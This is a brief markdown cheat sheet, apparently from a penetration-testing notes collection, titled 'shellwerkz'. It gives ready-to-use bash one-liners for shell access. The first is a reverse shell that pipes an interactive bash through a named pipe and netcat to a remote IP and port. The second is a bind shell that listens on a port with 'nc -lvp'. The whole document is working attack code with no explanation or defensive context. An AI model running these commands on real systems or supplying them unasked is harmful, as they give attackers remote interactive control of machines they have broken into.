# shellwerkz
You may need to use [`nc` with a proxy](./netcat.md).

# Reverse shell

## bash
```bash
mkfifo /tmp/ffifo; /bin/bash -i < /tmp/ffifo 2>&1 | nc $remote_ip $port > /tmp/ffifo
```

# Bind shell
## bash
```bash
mkfifo /tmp/f
/bin/sh -i 2>&1 < /tmp/f | nc -lvp $port > /tmp/f
```